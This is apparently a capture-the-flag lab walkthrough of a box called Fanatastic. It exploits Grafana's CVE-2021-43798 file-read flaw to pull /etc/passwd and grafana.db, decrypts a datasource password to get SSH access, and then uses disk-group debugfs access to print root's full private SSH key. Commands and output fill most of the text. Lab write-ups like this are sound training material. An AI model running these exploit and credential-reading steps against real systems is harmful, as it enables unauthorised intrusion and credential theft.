##### Tags: `disk`  `id_rsa`  `sqlite-viewer`  `Grafana`  `go set up`

# 🐧Fanatastic🐧
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.175.181

PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
3000/tcp  open     http    Grafana http
9090/tcp  open     http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
```
port 9090 is nothing intersted  
port 3000 is running Grafana v8.3.0  (CVE-2021-43798)
https://github.com/mauricelambert/LabAutomationCVE-2021-43798  
we can read file remotely, and found there is a sysadmin can login via ssh
```console
$ python3 CVE_2021_43798.py -f /etc/passwd 192.168.175.181:3000
[*] Plugin found: input
root:x:0:0:root:/root:/bin/bash
sysadmin:x:1001:1001::/home/sysadmin:/bin/sh
```
since we can read file, we will read the log file to find the passwd  
https://github.com/jas502n/Grafana-CVE-2021-43798?tab=readme-ov-file  
from this instruction, we can find the password in /var/lib/grafana/grafana.db 
but the output is too big, we redirect it to a txt file and check it
```console
$ python3 CVE_2021_43798.py -f /var/lib/grafana/grafana.db 192.168.175.181:3000 > 1.txt
```
we strings and found the output is SQLite format
```console
$ strings 1.txt
SQLite format 3
```
we can drop the file to https://inloop.github.io/sqlite-viewer/  
from the exploit instruction
we need the data source to decode to get the password  
we can get the information in the sqlite-viewer tools
```console
## data source
anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w==
```
then we use go to decode and get the password
```console
## set up the go env

$ go mod init 123
go: creating new go.mod: module 123
go: to add module requirements and sums:
        go mod tidy
```
```console
$ go mod tidy          
go: finding module for package golang.org/x/crypto/pbkdf2
go: downloading golang.org/x/crypto v0.48.0
go: found golang.org/x/crypto/pbkdf2 in golang.org/x/crypto v0.48.0
```
then we edit the file AESDecrypt.go to change the data source and run it
```console
$ go run AESDecrypt.go
[*] grafanaIni_secretKey= SW2YcwTIb9zpOOhoPsMm
[*] DataSourcePassword= anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w==
[*] plainText= SuperSecureP@ssw0rd
```
we got the password and ssh to sysadmin
```console
$ ssh sysadmin@192.168.175.181
sysadmin@192.168.175.181's password: SuperSecureP@ssw0rd
sysadmin@fanatastic:~$ id
uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin),6(disk)
```
## Privilege Escalation
since we are in disk group, means we can use debug function to read all sensitive file  
check where the root is in (the largest % one)
```console
sysadmin@fanatastic:/$ df -h
Filesystem      Size  Used Avail Use% Mounted on
udev            445M     0  445M   0% /dev
tmpfs            98M  1.2M   97M   2% /run
/dev/sda2       9.8G  5.6G  3.7G  61% /
```
debug and read the id_rsa of root
```console
sysadmin@fanatastic:/$ debugfs -w /dev/sda2
debugfs 1.45.5 (07-Jan-2020)
debugfs:  mkdir test
debugfs:  cat /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
T3skewpHe8tDUAAAALcm9vdEB1YnVudHU=
-----END OPENSSH PRIVATE KEY-----
```
login as root
```console
$ nano id_rsa                
                                                                                                                  
$ chmod 600 id_rsa

$ ssh root@192.168.175.181 -i id_rsa
root@fanatastic:~# id
uid=0(root) gid=0(root) groups=0(root)
```
